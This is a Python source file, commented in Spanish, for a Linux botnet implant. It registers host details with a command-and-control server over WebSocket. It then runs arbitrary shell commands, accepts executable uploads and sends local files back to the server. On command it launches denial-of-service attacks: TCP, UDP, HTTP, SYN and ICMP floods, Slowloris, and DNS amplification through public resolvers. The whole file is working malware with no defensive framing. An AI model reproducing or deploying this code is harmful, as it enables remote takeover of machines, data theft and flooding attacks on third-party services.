import asyncio
import json
import subprocess
import signal
import sys
import os
import base64
import socket
import random
import threading
import time
import uuid
import re
from websockets import connect
from websockets.exceptions import ConnectionClosedError
from typing import List, Dict, Tuple, Optional
import requests

class LinuxImpl:
    def __init__(self, c2_ws_url: str, group: str = "grupo1"):
        self.c2_ws_url = c2_ws_url
        self.group = group
        self.current_dir = os.getcwd()
        self.upload_buffer = []
        self.upload_destination = None
        self.running = True
        self.active_attack = False
        self.attack_thread = None
        
        # Configurar manejador de señales
        signal.signal(signal.SIGINT, self._def_handler)
    
    async def run(self) -> None:
        """Método principal para iniciar el implante"""
        await self.register()
        while self.running:
            try:
                await self._connect_to_c2()
            except Exception as e:
                print(f"Error de conexión: {e}, reintentando en 5 segundos...")
                await asyncio.sleep(5)
    
    async def _connect_to_c2(self) -> None:
        """Establece conexión WebSocket con el C2"""
        async with connect(f"{self.c2_ws_url}?id={self.impl_id}") as ws:
            print(f"[+] Conectado a C2 en {self.c2_ws_url}")
            while self.running:
                await self._handle_commands(ws)
    
    async def _handle_commands(self, ws) -> None:
        """Maneja los comandos recibidos del C2"""
        try:
            cmd = await ws.recv()
            data = json.loads(cmd.replace("'", '"'))
            print(f"[+] Comando recibido: {data}")
            
            if 'cmd' in data:
                await self._execute_command(ws, data['cmd'])
            elif 'chunk' in data:
                await self._handle_file_upload(ws, data)
            elif 'list_files' in data:
                await self._list_directory(ws, data.get('path', self.current_dir))
            elif 'get_files' in data:
                await self._send_file(ws, data['get_files'])
            elif 'attack' in data:
                await self._handle_attack_command(ws, data)
            elif 'stop_attack' in data:
                await self._stop_attack(ws)
        
        except ConnectionClosedError:
            print("[-] Conexión cerrada por el servidor")
            raise
        except Exception as e:
            print(f"[-] Error procesando comando: {e}")
            await ws.send(json.dumps({"error": str(e)}))
    
    async def _execute_command(self, ws, command: str) -> None:
        """Ejecuta un comando del sistema y devuelve el resultado"""
        command = command.strip()
        
        if command.startswith("cd "):
            await self._change_directory(ws, command[3:].strip())
        else:
            out, err, cwd = self._execute_shell_command(command)
            await ws.send(json.dumps({
                "result": out if out else err,
                "cwd": cwd
            }))
    
    async def _change_directory(self, ws, path: str) -> None:
        """Maneja el comando de cambio de directorio"""
        path = path.replace('"', '')
        if path == "..":
            self.current_dir = os.path.dirname(self.current_dir)
        else:
            new_path = os.path.abspath(os.path.join(self.current_dir, path))
            if os.path.isdir(new_path):
                self.current_dir = new_path
            else:
                await ws.send(json.dumps({
                    "error": f"El directorio '{path}' no existe.",
                    "cwd": self.current_dir
                }))
                return
        
        await ws.send(json.dumps({
            "result": "",
            "error": "",
            "cwd": self.current_dir
        }))
    
    def _execute_shell_command(self, command: str) -> Tuple[str, str, str]:
        """Ejecuta un comando en el shell y retorna stdout, stderr y el directorio actual"""
        escaped_cmd = command.replace('"', '\"')
        result = subprocess.run(
            ['/bin/bash', '-c', f'cd "{self.current_dir}" && {escaped_cmd}'],
            capture_output=True, 
            text=True
        )
        return result.stdout, result.stderr, self.current_dir
    
    async def _handle_file_upload(self, ws, data: Dict) -> None:
        """Maneja la subida de archivos por chunks"""
        try:
            part = base64.b64decode(data['chunk']['data'])
            is_last = data['chunk'].get('last', False)
            
            self.upload_buffer.append(part)
            
            if self.upload_destination is None:
                self.upload_destination = data['destination']
            
            if is_last:
                with open(self.upload_destination, "wb") as f:
                    for chunk in self.upload_buffer:
                        f.write(chunk)
                
                # Limpieza del buffer
                self.upload_buffer.clear()
                self.upload_destination = None
                
                # Dar permisos de ejecución si es necesario
                os.chmod(self.upload_destination, 0o755)
                
                await ws.send(json.dumps({
                    "status": "success",
                    "message": f"Archivo recibido en {self.upload_destination}"
                }))
        
        except Exception as e:
            await ws.send(json.dumps({
                "status": "error",
                "message": str(e)
            }))
    
    async def _list_directory(self, ws, path: str) -> None:
        """Lista los archivos en un directorio"""
        if not os.path.exists(path):
            await ws.send(json.dumps({
                "error": f"Ruta no encontrada: {path}"
            }))
            return
        
        items = []
        try:
            for name in os.listdir(path):
                full_path = os.path.join(path, name)
                item_type = "directory" if os.path.isdir(full_path) else "file"
                items.append({
                    "name": name,
                    "type": item_type,
                    "size": os.path.getsize(full_path) if item_type == "file" else 0,
                    "permissions": oct(os.stat(full_path).st_mode)[-3:]
                })
            
            await ws.send(json.dumps({
                "items": items,
                "path": path,
                "status": "success"
            }))
        
        except Exception as e:
            await ws.send(json.dumps({
                "error": str(e),
                "status": "error"
            }))
    
    async def _send_file(self, ws, file_path: str) -> None:
        """Envía un archivo al C2"""
        if not os.path.isfile(file_path):
            await ws.send(json.dumps({
                "error": f"Archivo no encontrado: {file_path}",
                "status": "error"
            }))
            return
        
        try:
            with open(file_path, "rb") as f:
                content = base64.b64encode(f.read()).decode("utf-8")
            
            await ws.send(json.dumps({
                "filename": os.path.basename(file_path),
                "path": file_path,
                "content": content,
                "status": "success"
            }))
        except Exception as e:
            await ws.send(json.dumps({
                "error": str(e),
                "status": "error"
            }))
    
    async def _handle_attack_command(self, ws, data: Dict) -> None:
        """Maneja los comandos de ataque"""
        attack_type = data['attack']['type']
        target = data['attack']['target']
        duration = int(data['attack'].get('duration', 60))
        
        # Detener cualquier ataque previo
        if self.active_attack:
            await self._stop_attack(ws)
        
        # Iniciar nuevo ataque
        self.active_attack = True
        self.attack_thread = threading.Thread(
            target=self._execute_attack,
            args=(attack_type, target, duration, ws),
            daemon=True
        )
        self.attack_thread.start()
        
        await ws.send(json.dumps({
            "status": "attack_started",
            "attack_type": attack_type,
            "target": target,
            "duration": duration
        }))
    
    def _execute_attack(self, attack_type: str, target: str, duration: int, ws) -> None:
        """Ejecuta el ataque en un hilo separado"""
        end_time = time.time() + duration
        
        try:
            if attack_type == "tcp_flood":
                self._tcp_flood_attack(target, end_time)
            elif attack_type == "udp_flood":
                self._udp_flood_attack(target, end_time)
            elif attack_type == "http_flood":
                self._http_flood_attack(target, end_time)
            elif attack_type == "slowloris":
                self._slowloris_attack(target, end_time)
            elif attack_type == "syn_flood":
                self._syn_flood_attack(target, end_time)
            elif attack_type == "icmp_flood":
                self._icmp_flood_attack(target, end_time)
            elif attack_type == "dns_amplification":
                self._dns_amplification_attack(target, end_time)
            else:
                print(f"[!] Tipo de ataque no reconocido: {attack_type}")
        except Exception as e:
            print(f"[!] Error en el ataque: {e}")
        finally:
            self.active_attack = False
    
    def _tcp_flood_attack(self, target: str, end_time: float) -> None:
        """Ataque de inundación TCP para Linux"""
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and self.active_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, target_port))
                s.send(os.urandom(1024))
                s.close()
            except:
                pass
    
    def _udp_flood_attack(self, target: str, end_time: float) -> None:
        """Ataque de inundación UDP para Linux"""
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and self.active_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(os.urandom(1024), (target_ip, target_port))
                s.close()
            except:
                pass
    
    def _http_flood_attack(self, target: str, end_time: float) -> None:
        """Ataque de inundación HTTP para Linux"""
        import urllib.request
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
            'Accept': '*/*',
            'Connection': 'close'
        }
        
        request = urllib.request.Request(
            url=target,
            headers=headers,
            method='GET'
        )
        
        print(f"[*] Iniciando HTTP Flood a {target}")
        
        while time.time() < end_time and self.active_attack:
            try:
                with urllib.request.urlopen(request, timeout=5) as response:
                    response.read(64)
                time.sleep(0.01)
            except Exception as e:
                print(f"[!] Error: {str(e)}")
                time.sleep(1)
        
        print("[*] Ataque HTTP Flood finalizado")
    
    def _slowloris_attack(self, target: str, end_time: float) -> None:
        """Ataque Slowloris para Linux"""
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        sockets = []
        
        try:
            while time.time() < end_time and self.active_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                    sockets.append(s)
                except:
                    self._close_sockets(sockets)
                    sockets = []
                
                for s in sockets:
                    try:
                        s.send("X-a: b\r\n".encode())
                    except:
                        sockets.remove(s)
                
                time.sleep(15)
        finally:
            self._close_sockets(sockets)
    
    def _syn_flood_attack(self, target: str, end_time: float) -> None:
        """Ataque SYN flood para Linux (requiere root)"""
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and self.active_attack:
            try:
                # En Linux podemos usar el módulo scapy para mejor control
                from scapy.all import IP, TCP, send
                packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
                send(packet, verbose=0)
            except ImportError:
                # Fallback básico si scapy no está instalado
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    s.sendto(b'\x00'*64, (target_ip, target_port))
                    s.close()
                except:
                    pass
            except:
                pass
    
    def _icmp_flood_attack(self, target: str, end_time: float) -> None:
        """Ataque ICMP flood (Ping flood) para Linux"""
        while time.time() < end_time and self.active_attack:
            try:
                os.system(f"ping -c 1 -s 65500 {target} > /dev/null 2>&1")
            except:
                pass
    
    def _dns_amplification_attack(self, target: str, end_time: float) -> None:
        """Ataque de amplificación DNS para Linux"""
        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]
        target_ip = target.split(":")[0]
        
        while time.time() < end_time and self.active_attack:
            try:
                for dns_server in dns_servers:
                    # Consulta DNS tipo ANY para amplificación
                    query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01'
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(query, (dns_server, 53))
                    s.close()
            except:
                pass
    
    def _close_sockets(self, sockets: list) -> None:
        """Cierra todos los sockets en la lista"""
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    async def _stop_attack(self, ws) -> None:
        """Detiene cualquier ataque en curso"""
        self.active_attack = False
        
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=1)
        
        await ws.send(json.dumps({
            "status": "attack_stopped",
            "message": "Ataque detenido correctamente"
        }))
    
    async def register(self) -> None:
        """Registra el implante con el servidor C2"""
        model = {
            'impl_mac': self._get_macs(),
            'group': self.group,
            'public_ip': self._get_public_ip(),
            'local_ip': self._get_local_ips(),
            'operating_system': self._get_operating_system(),
            'impl_id': self.impl_id
        }
 
        print(f"[+] Implante registrado: {model}")
        req = requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)

    @property
    def impl_id(self) -> str:
        """Obtiene un ID único para el implante en Linux"""
        try:
            # Intentar obtener ID único de la máquina
            with open('/etc/machine-id') as f:
                return f.read().strip()
        except:
            # Fallback a UUID generado
            return str(uuid.uuid4())
    
    def _get_macs(self) -> List[str]:
        """Obtiene las direcciones MAC de las interfaces de red en Linux"""
        try:
            macs = []
            for iface in os.listdir('/sys/class/net/'):
                if iface != 'lo':  # Ignorar loopback
                    with open(f'/sys/class/net/{iface}/address') as f:
                        mac = f.read().strip()
                        if mac:
                            macs.append(mac)
            return macs if macs else ['undefined']
        except:
            return ['undefined']
    
    def _get_local_ips(self) -> List[str]:
        """Obtiene las direcciones IP locales en Linux"""
        try:
            result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
            ips = result.stdout.strip().split()
            return ips if ips else ['undefined']
        except:
            return ['undefined']
    
    def _get_public_ip(self) -> str:
        """Obtiene la dirección IP pública en Linux"""
        try:
            result = subprocess.run(
                ['curl', '-s', 'https://api.ipify.org'],
                capture_output=True,
                text=True
            )
            return result.stdout.strip() if result.stdout.strip() else "undefined"
        except:
            return "undefined"
    
    def _get_operating_system(self) -> str:
        """Obtiene información del sistema operativo en Linux"""
        try:
            with open('/etc/os-release') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME='):
                        return line.split('=')[1].strip().strip('"')
            return "Linux (Unknown Distro)"
        except:
            return "Linux"
    
    def _def_handler(self, sig, frame) -> None:
        """Manejador de señales para salida limpia"""
        print("\n\n[!] Saliendo..\n")
        self.running = False
        self.active_attack = False
        sys.exit(1)

if __name__ == "__main__":
    # Configuración del implante
    C2_WS_URL = "ws://localhost:4000/api/rcv"
    GROUP_NAME = "grupo1"
    
    impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
    asyncio.run(impl.run())